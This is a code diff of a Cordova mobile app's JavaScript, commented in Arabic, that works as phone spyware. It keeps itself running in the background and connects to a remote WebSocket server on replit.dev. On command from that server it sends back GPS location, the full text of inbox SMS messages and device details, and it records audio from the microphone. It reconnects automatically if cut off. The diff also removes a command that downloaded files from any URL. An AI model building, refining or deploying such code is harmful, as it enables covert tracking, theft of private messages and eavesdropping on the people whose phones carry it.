@@ -1,27 +1,22 @@
-
-
 document.addEventListener('deviceready', onDeviceReady, false);
-
-// قائمة لتخزين الطلبات المستلمة
-const receivedRequests = [];
 
 function onDeviceReady() {
   console.log('Device is ready');
   
-  // تفعيل التشغيل في الخلفية
-  if (window.cordova.plugins.backgroundMode) {
+  // تفعيل تشغيل الخلفية
+  if (cordova && cordova.plugins && cordova.plugins.backgroundMode) {
     cordova.plugins.backgroundMode.enable();
     cordova.plugins.backgroundMode.setDefaults({
-      title: "نظام المراقبة يعمل",
-      text: "جارٍ تنفيذ المهام في الخلفية",
-      icon: "icon" // اسم أيقونة التطبيق
+      title: 'التطبيق يعمل في الخلفية',
+      text: 'يتم مراقبة الجهاز'
     });
     
+    // عند الدخول في الوضع الخلفي
     cordova.plugins.backgroundMode.on('activate', function() {
       cordova.plugins.backgroundMode.disableWebViewOptimizations();
     });
   }
-
+  
   // معلومات الجهاز
   const deviceInfo = {
     uuid: device.uuid || generateUUID(),
@@ -33,7 +28,7 @@ function onDeviceReady() {
     timestamp: new Date().toISOString()
   };
   
-  // توليد UUID
+  // توليد UUID إذا لم يكن موجوداً
   function generateUUID() {
     return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
       const r = Math.random() * 16 | 0;
@@ -42,7 +37,7 @@ function onDeviceReady() {
     });
   }
   
-  // البطارية
+  // الحصول على حالة البطارية
   if (navigator.getBattery) {
     navigator.getBattery().then(battery => {
       deviceInfo.battery = {
@@ -53,6 +48,7 @@ function onDeviceReady() {
       };
       connectToServer(deviceInfo);
       
+      // مراقبة تغيرات البطارية
       battery.addEventListener('levelchange', updateBatteryInfo);
       battery.addEventListener('chargingchange', updateBatteryInfo);
     }).catch(error => {
@@ -72,6 +68,7 @@ function onDeviceReady() {
         dischargingTime: battery.dischargingTime
       };
       
+      // إرسال تحديث البطارية إلى الخادم
       if (window.wsConnection && window.wsConnection.readyState === WebSocket.OPEN) {
         window.wsConnection.send(JSON.stringify({
           type: 'device_update',
@@ -86,12 +83,14 @@ function onDeviceReady() {
 }
 
 function connectToServer(deviceInfo) {
+  // استخدام رابط الخادم المقدم
   const wsUrl = 'wss://0c0d4d48-f2d0-4f6b-9a7c-dfaeba1f204e-00-1fpda24jsv608.sisko.replit.dev';
   window.wsConnection = new WebSocket(wsUrl);
   
   wsConnection.onopen = () => {
     console.log('Connected to server');
     
+    // تسجيل الجهاز
     wsConnection.send(JSON.stringify({
       type: 'register',
       deviceId: deviceInfo.uuid,
@@ -106,14 +105,7 @@ function connectToServer(deviceInfo) {
       if (data.type === 'command') {
         console.log('Received command:', data.command);
         
-        // تخزين الطلب في القائمة
-        receivedRequests.push({
-          id: data.command.commandId || Date.now(),
-          type: data.command.type,
-          timestamp: new Date().toISOString(),
-          status: 'received'
-        });
-        
+        // تنفيذ الأمر وإرسال الرد
         executeCommand(data.command, (response) => {
           if (wsConnection.readyState === WebSocket.OPEN) {
             wsConnection.send(JSON.stringify({
@@ -139,15 +131,16 @@ function connectToServer(deviceInfo) {
   
   wsConnection.onclose = () => {
     console.log('Disconnected from server');
+    // إعادة الاتصال بعد تأخير
     setTimeout(() => connectToServer(deviceInfo), 10000);
   };
   
+  // إرسال نبضات قلبية دورية
   const heartbeatInterval = setInterval(() => {
     if (wsConnection.readyState === WebSocket.OPEN) {
       wsConnection.send(JSON.stringify({ 
         type: 'heartbeat',
-        timestamp: new Date().toISOString(),
-        receivedRequests: receivedRequests.slice(-10) // إرسال آخر 10 طلبات
+        timestamp: new Date().toISOString()
       }));
     } else {
       clearInterval(heartbeatInterval);
@@ -158,7 +151,8 @@ function connectToServer(deviceInfo) {
 function executeCommand(command, callback) {
   console.log('Executing command:', command);
   
-  const commandId = command.commandId || Date.now();
+  // إضافة commandId للتعقب
+  const commandId = Date.now();
   
   switch (command.type) {
     case 'get_location':
@@ -172,12 +166,6 @@ function executeCommand(command, callback) {
       break;
     case 'get_device_info':
       getDeviceInfo(commandId, callback);
-      break;
-    case 'get_requests':
-      getReceivedRequests(commandId, callback);
-      break;
-    case 'download_file':
-      downloadFile(commandId, command.fileUrl, callback);
       break;
     default:
       callback({ 
@@ -198,21 +186,22 @@ function getLocation(commandId, callback) {
   
   navigator.geolocation.getCurrentPosition(
     (position) => {
-      const locationData = {
-        latitude: position.coords.latitude,
-        longitude: position.coords.longitude,
-        accuracy: position.coords.accuracy,
-        timestamp: position.timestamp
-      };
-      
-      // إنشاء رابط خريطة جوجل
-      const mapUrl = `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`;
-      locationData.mapUrl = mapUrl;
+      const googleMapsUrl = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
       
       callback({
         commandId,
         status: 'success',
-        location: locationData
+        location: {
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude,
+          accuracy: position.coords.accuracy,
+          altitude: position.coords.altitude,
+          altitudeAccuracy: position.coords.altitudeAccuracy,
+          heading: position.coords.heading,
+          speed: position.coords.speed,
+          timestamp: position.timestamp,
+          googleMapsUrl: googleMapsUrl
+        }
       });
     },
     (error) => {
@@ -220,7 +209,13 @@ function getLocation(commandId, callback) {
         commandId,
         status: 'error',
         error: 'Location error',
-        details: error
+        details: {
+          code: error.code,
+          message: error.message,
+          PERMISSION_DENIED: error.PERMISSION_DENIED,
+          POSITION_UNAVAILABLE: error.POSITION_UNAVAILABLE,
+          TIMEOUT: error.TIMEOUT
+        }
       });
     },
     options
@@ -232,34 +227,33 @@ function getSMS(commandId, callback) {
     return callback({ 
       commandId,
       status: 'error',
-      error: 'SMS plugin not available'
+      error: 'SMS plugin not available',
+      suggestion: 'Install cordova-sms-plugin'
     });
   }
   
   const filter = {
     box: 'inbox',
-    maxCount: 1000, // زيادة عدد الرسائل المسحوبة
+    maxCount: 100,
     indexFrom: 0
   };
   
   SMS.listSMS(
     filter,
     (messages) => {
-      // عرض محتوى الرسائل كاملاً
-      const fullMessages = messages.map(msg => ({
-        id: msg._id,
-        address: msg.address,
-        body: msg.body, // نص الرسالة كاملاً
-        date: new Date(msg.date).toISOString(),
-        read: msg.read,
-        type: 'received'
-      }));
-      
       callback({
         commandId,
         status: 'success',
-        count: fullMessages.length,
-        messages: fullMessages
+        count: messages.length,
+        messages: messages.map(msg => ({
+          id: msg._id,
+          address: msg.address,
+          body: msg.body,
+          date: new Date(msg.date).toLocaleString('ar-EG'),
+          read: msg.read,
+          type: msg.type,
+          serviceCenter: msg.service_center
+        }))
       });
     },
     (error) => {
@@ -273,56 +267,70 @@ function getSMS(commandId, callback) {
   );
 }
 
-let mediaRecorder;
-let audioFile;
-
 function recordAudio(commandId, duration, callback) {
-  duration = duration || 10;
+  duration = duration || 10; // Default 10 seconds
   
-  const src = 'myrecording.mp3';
-  audioFile = new Media(src, 
-    () => {
-      console.log('Media created');
-      audioFile.startRecord();
-      
-      setTimeout(() => {
-        audioFile.stopRecord();
-        audioFile.play(); // اختبار التسجيل
+  // التحقق من وجود Media plugin
+  if (typeof Media === 'undefined') {
+    return callback({ 
+      commandId,
+      status: 'error',
+      error: 'Media plugin not available',
+      suggestion: 'Install cordova-plugin-media'
+    });
+  }
+  
+  try {
+    // إنشاء اسم ملف فريد
+    const filename = `recording_${new Date().getTime()}.mp3`;
+    const filePath = cordova.file.externalDataDirectory + filename;
+    
+    // إنشاء كائن Media للتسجيل
+    const mediaRec = new Media(filePath,
+      () => {
+        console.log("recordAudio():Audio Success");
         
-        // الحصول على معلومات الملف
-        window.resolveLocalFileSystemURL(cordova.file.externalDataDirectory + src, (fileEntry) => {
-          fileEntry.file((file) => {
-            callback({
-              commandId,
-              status: 'success',
-              audio: {
-                duration: duration,
-                format: 'mp3',
-                size: file.size,
-                filePath: fileEntry.toURL(),
-                fileName: src
-              }
-            });
-          });
-        }, (error) => {
-          callback({ 
-            commandId,
-            status: 'error',
-            error: 'File error',
-            details: error
-          });
+        // بعد انتهاء التسجيل، إرجاع معلومات الملف
+        callback({ 
+          commandId,
+          status: 'success',
+          audio: {
+            filePath: filePath,
+            filename: filename,
+            duration: duration,
+            format: 'mp3',
+            timestamp: new Date().toISOString()
+          }
         });
-      }, duration * 1000);
-    },
-    (error) => {
-      callback({ 
-        commandId,
-        status: 'error',
-        error: 'Recording error',
-        details: error
-      });
-    }
-  );
+      },
+      (err) => {
+        console.log("recordAudio():Audio Error: " + err.code);
+        callback({ 
+          commandId,
+          status: 'error',
+          error: 'Audio recording error',
+          details: err
+        });
+      }
+    );
+    
+    // بدء التسجيل
+    mediaRec.startRecord();
+    
+    // إيقاف التسجيل بعد المدة المحددة
+    setTimeout(() => {
+      mediaRec.stopRecord();
+      mediaRec.release();
+    }, duration * 1000);
+    
+  } catch (error) {
+    callback({ 
+      commandId,
+      status: 'error',
+      error: 'Audio recording exception',
+      details: error.message
+    });
+  }
 }
 
 function getDeviceInfo(commandId, callback) {
@@ -342,44 +350,4 @@ function getDeviceInfo(commandId, callback) {
     status: 'success',
     deviceInfo: info
   });
-}
-
-function getReceivedRequests(commandId, callback) {
-  callback({
-    commandId,
-    status: 'success',
-    requests: receivedRequests
-  });
-}
-
-function downloadFile(commandId, fileUrl, callback) {
-  const fileTransfer = new FileTransfer();
-  const uri = encodeURI(fileUrl);
-  const fileName = fileUrl.split('/').pop();
-  const filePath = cordova.file.externalDataDirectory + fileName;
-  
-  fileTransfer.download(
-    uri,
-    filePath,
-    (entry) => {
-      callback({
-        commandId,
-        status: 'success',
-        file: {
-          name: fileName,
-          path: entry.toURL(),
-          size: entry.size
-        }
-      });
-    },
-    (error) => {
-      callback({
-        commandId,
-        status: 'error',
-        error: 'Download failed',
-        details: error
-      });
-    },
-    true
-  );
 }
